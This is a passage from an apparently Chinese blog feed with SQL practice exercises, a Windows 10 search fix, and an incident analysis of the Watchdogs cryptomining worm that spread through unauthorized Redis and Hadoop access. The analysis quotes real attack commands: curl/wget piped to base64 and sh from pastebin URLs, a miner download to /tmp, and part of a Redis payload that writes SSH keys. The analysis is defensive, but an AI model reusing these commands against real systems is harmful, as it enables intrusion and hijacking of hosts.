    <content type="html"><![CDATA[<p>SQL看似简单其实也包含了相当多的内容</p><p>慢慢积累吧，最近状态不咋好，一点点来</p><a id="more"></a> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查找最晚入职员工的所有信息</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`employees`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`birth_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`first_name`</span> <span class="built_in">varchar</span>(<span class="number">14</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`last_name`</span> <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`gender`</span> <span class="built_in">char</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`hire_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">--有个答案是</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> employees</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> hire_date <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="comment">--但是这个答案有个问题，当一天由多个同事入职的时候会出现歧义</span></span><br><span class="line"><span class="comment">--所以用下面的方法是绝对正确的</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> employees <span class="keyword">where</span> hire_date = (<span class="keyword">select</span> <span class="keyword">max</span>(hire_date) <span class="keyword">from</span> employees)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查找入职员工时间排名倒数第三的员工所有信息</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`employees`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`birth_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`first_name`</span> <span class="built_in">varchar</span>(<span class="number">14</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`last_name`</span> <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`gender`</span> <span class="built_in">char</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`hire_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--LIMIT m,n : 表示从第m+1条开始，取n条数据；</span></span><br><span class="line"><span class="comment">--LIMIT n ： 表示从第0条开始，取n条数据，是limit(0,n)的缩写。</span></span><br><span class="line"><span class="comment">--考察点是limit的用法</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> employees</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> hire_date <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--与此同时还有一种想法觉得入职日期，只要是同一天的也就不分前后，也就是说，题目转换为了倒数三天前入职的所有同事。</span></span><br><span class="line"><span class="keyword">select</span> * </span><br><span class="line"><span class="keyword">from</span> employees </span><br><span class="line"><span class="keyword">where</span> hire_date = </span><br><span class="line">    (<span class="keyword">select</span> <span class="keyword">distinct</span> hire_date </span><br><span class="line">     <span class="keyword">from</span> employees </span><br><span class="line">     <span class="keyword">order</span> <span class="keyword">by</span> hire_date <span class="keyword">DESC</span> </span><br><span class="line">     <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">--同时考虑到distinct效率问题还可以改用group by</span></span><br><span class="line"><span class="comment">--经过测试，这种写法确实比上面的效率要高一点，同时应该要注意到这个应该和数据量也有关系</span></span><br><span class="line"><span class="keyword">select</span> * </span><br><span class="line"><span class="keyword">from</span> employees</span><br><span class="line"><span class="keyword">where</span> hire_date = </span><br><span class="line">(<span class="keyword">select</span> hire_date</span><br><span class="line">    <span class="keyword">from</span> employees</span><br><span class="line">    <span class="keyword">group</span> <span class="keyword">by</span> hire_date</span><br><span class="line">    <span class="keyword">order</span> <span class="keyword">by</span> hire_date <span class="keyword">desc</span></span><br><span class="line">    <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查找各个部门当前(to_date='9999-01-01')领导当前薪水详情以及其对应部门编号dept_no</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`dept_manager`</span> (</span><br><span class="line"><span class="string">`dept_no`</span> <span class="built_in">char</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`from_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`to_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>,<span class="string">`dept_no`</span>));</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`salaries`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`salary`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`from_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`to_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>,<span class="string">`from_date`</span>));</span><br><span class="line"><span class="comment">--要求输出格式：</span></span><br><span class="line"><span class="comment">--emp_nosalaryfrom_dateto_datedept_no</span></span><br><span class="line"><span class="comment">--答案一：先在两个表里用where过滤出现任的人选，然后用相等简单相等关联即可。</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    s.*, dm.dept_no</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">    salaries <span class="keyword">as</span> s,</span><br><span class="line">    dept_manager <span class="keyword">as</span> dm</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    s.to_date = <span class="string">'9999-01-01'</span></span><br><span class="line"><span class="keyword">and</span></span><br><span class="line">    dm.to_date = <span class="string">'9999-01-01'</span></span><br><span class="line"><span class="keyword">and</span></span><br><span class="line">    s.emp_no = dm.emp_no;</span><br><span class="line"><span class="comment">--答案二：</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    s.* , d.dept_no</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">    salaries <span class="keyword">as</span> s</span><br><span class="line"><span class="keyword">join</span></span><br><span class="line">    dept_manager <span class="keyword">as</span> d</span><br><span class="line"><span class="keyword">on</span></span><br><span class="line">    s.emp_no = d.emp_no</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    s.to_date = <span class="string">'9999-01-01'</span></span><br><span class="line"><span class="keyword">and</span></span><br><span class="line">    d.to_date = <span class="string">'9999-01-01'</span></span><br><span class="line"><span class="comment">--此题比较坑，限制了两个to_date，是因为薪水可能会变，人员也可能会变。</span></span><br><span class="line">然后两个表的前后位置不能动，否则和输出不符，姑且理解为必须小表<span class="keyword">join</span>大表吧。</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查找所有已经分配部门的员工的last_name和first_name</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`dept_emp`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`dept_no`</span> <span class="built_in">char</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`from_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`to_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>,<span class="string">`dept_no`</span>));</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`employees`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`birth_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`first_name`</span> <span class="built_in">varchar</span>(<span class="number">14</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`last_name`</span> <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`gender`</span> <span class="built_in">char</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`hire_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>));</span><br><span class="line"><span class="comment">--我首先考虑的是没有使用join的情况</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    e.last_name, e.first_name, d.dept_no</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">    dept_emp <span class="keyword">as</span> d, employees <span class="keyword">as</span> e</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    d.emp_no = e.emp_no</span><br><span class="line"><span class="comment">--其实从效率方面考虑，使用join会不会好一点，好像使用自然连接不用on就可以</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    e.last_name, e.first_name, d.dept_no</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">    dept_emp <span class="keyword">as</span> d</span><br><span class="line"><span class="keyword">natural</span> <span class="keyword">join</span></span><br><span class="line">    employees <span class="keyword">as</span> e</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--下面这道还是类似的</span></span><br><span class="line"><span class="comment">--查找所有员工的last_name和first_name以及对应部门编号dept_no，也包括展示没有分配具体部门的员工</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`dept_emp`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`dept_no`</span> <span class="built_in">char</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`from_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`to_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>,<span class="string">`dept_no`</span>));</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`employees`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`birth_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`first_name`</span> <span class="built_in">varchar</span>(<span class="number">14</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`last_name`</span> <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`gender`</span> <span class="built_in">char</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`hire_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    e.last_name, e.first_name, d.dept_no</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">    employees <span class="keyword">as</span> e</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span></span><br><span class="line">    dept_emp <span class="keyword">as</span> d</span><br><span class="line"><span class="keyword">on</span></span><br><span class="line">    e.emp_no = d.emp_no</span><br><span class="line"><span class="comment">--简单的left join</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查找所有员工入职时候的薪水情况，给出emp_no以及salary， 并按照emp_no进行逆序</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`employees`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`birth_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`first_name`</span> <span class="built_in">varchar</span>(<span class="number">14</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`last_name`</span> <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`gender`</span> <span class="built_in">char</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`hire_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>));</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`salaries`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`salary`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`from_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`to_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>,<span class="string">`from_date`</span>));</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SQL看似简单其实也包含了相当多的内容&lt;/p&gt;
&lt;p&gt;慢慢积累吧，最近状态不咋好，一点点来&lt;/p&gt;
    
    </summary>
    
      <category term="SQL" scheme="http://yoursite.com/categories/SQL/"/>
    
    
      <category term="SQL" scheme="http://yoursite.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>win10搜索栏失效</title>
    <link href="http://yoursite.com/2020/03/09/win10%E6%90%9C%E7%B4%A2%E6%A0%8F%E5%A4%B1%E6%95%88/"/>
    <id>http://yoursite.com/2020/03/09/win10搜索栏失效/</id>
    <published>2020-03-09T10:03:39.299Z</published>
    <updated>2019-05-09T18:01:34.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>打开电脑突然发现，win10菜单的快速搜索APP功能失效了</p></blockquote><a id="more"></a> <p>稍微研究了一下，很简单，两步解决<br>第一步</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start powershell</span><br></pre></td></tr></table></figure><p>第二步，在弹出的新窗口中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-AppXPackage -Name Microsoft.Windows.Cortana | Foreach &#123;Add-AppxPackage -DisableDevelopmentMode -Register "$($_.InstallLocation)\AppXManifest.xml"&#125;</span><br></pre></td></tr></table></figure><p>bingo！</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;打开电脑突然发现，win10菜单的快速搜索APP功能失效了&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Win" scheme="http://yoursite.com/categories/Win/"/>
    
      <category term="win10 bugs" scheme="http://yoursite.com/categories/Win/win10-bugs/"/>
    
    
      <category term="Win" scheme="http://yoursite.com/tags/Win/"/>
    
      <category term="Tips" scheme="http://yoursite.com/tags/Tips/"/>
    
  </entry>
  
  <entry>
    <title>hadoop病毒案例分析</title>
    <link href="http://yoursite.com/2020/03/09/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/03/09/大数据病毒分析/</id>
    <published>2020-03-09T10:03:38.941Z</published>
    <updated>2019-05-10T03:02:03.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>京东云和公司集群分别遇到过一次挖矿脚本，经过分析，发现两次挖矿事件有所不同，在这篇文档记录下两次挖矿事件的异同、总结和反思。</p></blockquote><a id="more"></a> <h3 id="第二次事件分析"><a href="#第二次事件分析" class="headerlink" title="第二次事件分析"></a>第二次事件分析</h3><p>我遇到的两次挖矿事件分别是由于<code>Hadoop Yarn REST API</code>未授权漏洞和<code>Redis</code>未授权访问漏洞这两种常见的配置问题引发的。</p><p>目前可以确定的是，第二次遇到的是Watchdogs蠕虫，这种蠕虫病毒第一次发现是2019年2月20日，阿里云安全监测到一起大规模挖矿事件，判断为Watchdogs蠕虫导致，该蠕虫短时间内即造成大量Linux主机沦陷，一方面是利用Redis未授权访问和弱密码这两种常见的配置问题进行传播，另一方面从known_hosts文件读取ip列表，用于登录信任该主机的其他主机。这两种传播手段都不是第一次用于蠕虫，但结合在一起爆发出巨大的威力。</p><p>蠕虫感染路径如下图：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v117hz8tj20z80iygok.jpg" alt></p><p>蠕虫传播方式：</p><p>攻击者首先扫描存在未授权访问或弱密码的Redis，并控制相应主机去请求以下地址：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pastebin.com/raw/sByq0rym</span><br></pre></td></tr></table></figure><p>该地址包含的命令是请求、base64解码并执行另一个url地址的内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(curl -fsSL https://pastebin.com/raw/D8E71JBJ||wget -q -O- https://pastebin.com/raw/D8E71JBJ)|base64 -d|sh</span><br></pre></td></tr></table></figure><p>而<a href="https://pastebin.com/raw/D8E71JBJ" target="_blank" rel="noopener">https://pastebin.com/raw/D8E71JBJ</a> 的内容解码后为一个bash脚本，脚本中又包含下载恶意程序Watchdogs的指令。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(curl -fsSL http://thyrsi.com/t6/672/1550667479x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667479x1822611209.jpg -O /tmp/watchdogs) &amp;&amp; chmod +x /tmp/watchdogs</span><br></pre></td></tr></table></figure><p>如上图所示，本次蠕虫的横向传播分为两块。</p><p>一是Bash脚本包含的如下内容，会直接读取主机上的/root/.ssh/known_hosts和/root/.ssh/id_rsa.pub文件，用于登录信任当前主机的机器，并控制这些机器执行恶意指令。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v13zzr57j20ix036my8.jpg" alt></p><p>二是Bash脚本下载的Watchdogs程序，通过对Redis的未授权访问和爆破、以及对SSH的爆破，进行横向传播。</p><p>具体为表现为，Watchdogs程序的Bbgo()函数中，首先获取要攻击的ip列表，随后尝试登录其他主机的ssh服务，一旦登录成功则执行恶意脚本下载命令。在Ago()函数中，则表现为针对其他主机Redis的扫描和攻击。</p><p>恶意Bash脚本</p><p>除了下载Watchdogs程序和横向传播外，Bash脚本还具有以下几项功能。</p><ol><li><p>将下载自身的指令添加到crontab定时任务里面，定时执行。</p></li><li><p>杀死同类的挖矿僵尸木马进程。</p></li><li><p>杀死CPU占用大于80%的进程</p></li></ol><p>bash脚本的功能也很很常见，一般来说挖矿程序几乎都有这样的功能。</p><p>Watchdogs程序为elf可执行文件，由go语言编译，其主要函数结构如下所示：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v14wnj8cj207v09nq2w.jpg" alt></p><p>1.<code>LibiosetWrite()</code></p><p>该函数主要执行libioset.so文件的写入</p><p>2.<code>Cron()</code></p><p>将恶意下载命令添加到/etc/cron.d/root等多个文件中，定时执行，加大清理难度</p><p>3.<code>KsoftirqdsWriteRun()</code></p><p>解压并写入挖矿程序及其配置文件</p><p>Bbgo()和Ago()函数的功能在“蠕虫传播方式”一节已有介绍，此处不再赘述。</p><p>综上，Watchdogs程序在Bash脚本执行的基础上，将进一步进行挖矿程序的释放和执行、恶意so文件写入以及剩余的横向传播。</p><p><code>libioset.so</code>分析</p><p>如图是<code>libioset.so</code>的导出函数表，包括<code>unlink</code>, <code>rmdir</code>, <code>readdir</code>等。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v1627gnej20rs0lqaay.jpg" alt></p><p>这里以执行rm命令必须调用的unlink()函数为例。</p><p>它只对不包含”ksoftirqds”、”ld.so.preload”、”libioset.so”这几个字符串的文件调用正常的unlink()，导致几个文件无法被正常删除。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v16ez6vbj2192042js9.jpg" alt></p><p>其他几个命令，如<code>readdir</code>也是类似，无法正常返回关于恶意程序的结果。</p><p>而<code>fopen</code>函数更是变本加厉，由于系统查询<code>cpu</code>使用情况和端口占用情况时，都会调用<code>fopen</code>，于是攻击者<code>hook</code>了这一函数，使其在读取<code>&#39;/proc/stat&#39;</code>和<code>&#39;/proc/net/tcp&#39;</code>等文件时，调用伪造函数。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v1737f5rj20r602qwez.jpg" alt></p><p>其中<code>forge_proc_cpu()</code>函数，将返回硬编码的字符串</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v17j9t4kj21c80eo0ul.jpg" alt></p><p>这种对查看系统状态功能的恶意hook，导致用户难以通过简单自查，确定挖矿是否存在以及挖矿进程是哪个。</p><p>“许多黑客模仿我的代码”——数据库蠕虫趋势统计</p><p>此次的Watchdogs挖矿蠕虫与18年出现的kworkerd蠕虫出自同一位作者（关于kworkerd挖矿僵尸网络参见《2018年云上挖矿分析报告》），因为它们使用了相同的钱包地址和相似的攻击手法。此外作者在恶意脚本末尾的注释也印证了这点：</p><p>#1.If you crack my program, please don’t reveal too much code online.Many hacker boys have copied my kworkerds code,more systems are being attacked.(Especially libioset)…</p><p>这段注释同时也揭露了一个事实，“许多黑客模仿我的代码”——当一个攻击者采取了某种攻击手法并取得成功，其他攻击者会纷纷模仿，很快将该手段加入自己的“攻击大礼包”。</p><p>这种模仿的结果是，据阿里云安全不完全统计，利用Redis未授权访问等问题进行攻击的蠕虫，数量已从2018年中的一个，上涨到如今的40余个，其中不乏DDG、8220这样臭名昭著的挖矿团伙。此外大部分近期新出现的蠕虫，都会加上Redis利用模块，因为实践证明互联网上错误配置的Redis数据库数量庞大，能从其中分一杯羹，攻击者的盈利就能有很大的提升。</p><p>因而如果不保护好Redis，用户面临的将不是一个蠕虫，而是40余个蠕虫此起彼伏的攻击。</p><p>下图所示为近半年来，针对Redis的攻击流量和目标机器数量趋势，从中不难看出Redis攻击逐渐被各大僵尸网络采用，并在2018年10月11月保持非常高的攻击量；而后在经历了3个月左右的沉寂期后，在今年2月再次爆发。</p><p>而Redis本身遭受攻击的主流方法也经过了三个阶段</p><p>1.攻击者对存在未授权访问的Redis服务器写入ssh key，从而可以畅通无阻登录ssh服务</p><p>具体为执行以下payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set x "\n\n\nssh-rsa 【sshkey】 root@kali\n\n\n"</span><br><span 